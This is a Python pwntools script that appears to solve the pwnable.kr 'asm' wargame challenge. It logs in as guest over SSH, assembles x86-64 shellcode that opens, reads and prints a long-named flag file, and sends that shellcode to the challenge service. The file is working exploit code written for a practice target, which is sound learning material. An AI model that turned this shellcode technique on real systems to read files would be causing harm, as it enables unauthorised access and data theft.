#!/usr/bin/env python

from pwn import *

e = ELF('./asm')

context.binary = e

# io = process(e.path)
server = ssh('asm', 'pwnable.kr', 2222, 'guest')
io = server.remote('0', 9026)

filename = "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
stub = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"
stub_address = 0x41414000

# Guess to be about len(asm(shellcode)) + a few bytes
filename_offset = 150


shellcode_address = stub_address + len(stub) + 1

filename_address = shellcode_address + filename_offset

buffer_address = filename_address + len(filename) + 10

# Guess a number larger than the flag size
read_length = 200

shellcode = asm("""
mov rdx, 0
mov rsi, 0                  /* O_RDONLY */
mov rdi, {filename_address}
mov rax, 2                  /* sys_open */
syscall                     /* fd = open(filename_address, O_RDONLY) */

mov rdx, {read_length}
mov rsi, {buffer_address}
mov rdi, rax
mov rax, 0                  /* sys_read */
syscall                     /* flag_len = read(fd, buffer_address, read_length) */

mov rdx, rax
mov rsi, {buffer_address}
mov rdi, 1                  /* stdout */
mov rax, 1                  /* sys_write */
syscall                     /* write(stdout, buffer_address, flag_len) */

mov rdi, 0
mov rax, 60                 /* sys_exit */
syscall                     /* exit(0) */
""".format(**locals()))

shellcode_len = len(shellcode)

if shellcode_len > filename_offset:
	print("The filename offset is not large enough, shellcode is " + str(shellcode_len) + " bytes long")
	exit(0)

io.recvuntil('shellcode:')

io.send(fit({0:shellcode, filename_offset: filename + '\0'}))

print(io.recvall())

io.close()

server.close()
